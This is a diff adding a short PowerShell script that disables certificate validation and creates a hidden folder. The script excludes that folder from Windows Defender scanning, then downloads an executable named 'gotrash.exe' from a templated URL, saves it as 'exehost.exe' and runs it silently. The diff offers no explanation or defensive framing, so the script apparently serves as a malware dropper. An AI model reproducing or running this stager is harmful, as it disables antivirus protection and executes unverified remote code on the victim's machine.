@@ -1,0 +1,11 @@
+[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+$webClient = new-object System.Net.WebClient
+$u="{STATIC_URL}/gotrash.exe";
+$d="tmp";
+$p=pwd;
+mkdir "$p\$d";
+(Get-Item "$p\$d" -Force).attributes="Hidden";
+Add-MpPreference -ExclusionPath "$p\$d";
+Start-Sleep -s 2;
+$webClient.DownloadFile($u, "$p\$d\exehost.exe")
+Start-Process -NoNewWindow "$p\$d\exehost.exe"
